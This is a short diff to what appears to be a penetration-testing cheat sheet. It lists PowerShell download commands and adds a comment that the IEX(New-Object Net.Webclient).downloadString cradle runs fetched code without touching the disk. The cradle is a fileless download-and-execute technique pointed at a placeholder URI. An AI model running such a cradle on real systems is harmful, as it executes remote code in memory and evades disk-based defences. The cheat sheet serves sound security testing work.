@@ -15,6 +15,7 @@ Web requests (if one doesnt work, try the other). PowerUp!
 ```PowerShell
 Invoke-WebRequest -Uri <target uri> -Method Get -Outfile <whatevs>.ps1 #IWR
 powershell IEX(New-Object Net.Webclient).downloadString("<target uri>") #Invoke-Expression
+#IEX if you want to execute without touching the disk
 ```
 
 "which" nix-style output.
